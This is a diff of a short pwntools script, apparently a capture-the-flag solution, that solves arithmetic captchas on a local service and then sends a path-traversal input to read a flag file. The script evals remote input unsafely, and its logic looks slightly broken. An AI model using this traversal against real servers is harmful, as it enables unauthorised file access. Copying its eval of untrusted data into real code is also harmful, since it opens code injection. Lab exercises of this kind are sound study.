@@ -1,19 +1,15 @@
 from pwn import *
-
+context.log_level = "debug"
 host = "localhost"
-port = 32774
-# public shellcode
-
-
+port = 32773
 p = remote(host, port)
 
-# step 1 auth (username password from binary)
 while True:
     p.recvuntil("Captcha:")
     expression = p.recvuntil("=")[:-1]
-    p.recv()
     p.sendline(str(eval(expression)))
-    if "directory: " in p.recv():
-        p.sendline("../etc/flag")
+    data = p.recv()
+    if "directory" in p.recv(): #wait for directory command
+        p.sendline("..\/etc/fla*")
+        print(p.recvline())
         break
-
